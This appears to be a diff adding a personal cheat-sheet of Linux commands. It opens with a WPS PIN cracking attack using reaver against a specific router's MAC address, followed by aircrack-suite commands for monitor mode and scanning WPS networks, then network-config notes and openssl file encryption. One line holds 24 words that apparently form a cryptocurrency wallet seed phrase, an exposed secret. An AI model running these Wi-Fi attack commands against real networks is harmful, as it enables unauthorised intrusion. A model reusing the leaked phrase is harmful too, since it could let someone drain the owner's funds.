@@ -1,0 +1,51 @@
+// hack a connection using pin:
+sudo reaver -i wlo1mon -b 84:16:F9:DE:48:AE -c 1 -f -w -vv -K 1
+
+//Killing these processes:
+airmon-ng check kill
+
+// enable monitor mode
+airmon-ng start wlo1
+
+// disable monitor mode
+airmon-ng stop wlo1mon
+
+// explore nearby networks
+airodump-ng --wps wlo1mon 
+
+
+
+//restart the network manager. It is usually done with the following command:
+service network-manager start
+
+
+
+
+
+
+
+
+
+
+// to disapble powersaver:2 to enable it :3
+/etc/NetworkManager/conf.d/default-wifi-powersave-on.conf
+
+// here you can find domain name servers you use
+/etc/resolv.conf
+welcome poverty eyebrow elder weird orphan shock someone faint hotel tail future dish student behave silly cross consider day hundred way vintage aspect display easily
+
+
+
+
+
+
+
+
+
+// encrypt a file 
+openssl enc -aes-256-cbc -salt -in input_file.txt -out encrypted_file.enc
+
+
+// decrypt a file
+openssl enc -d -aes-256-cbc -in encrypted_file.enc -out decrypted_file.txt
+
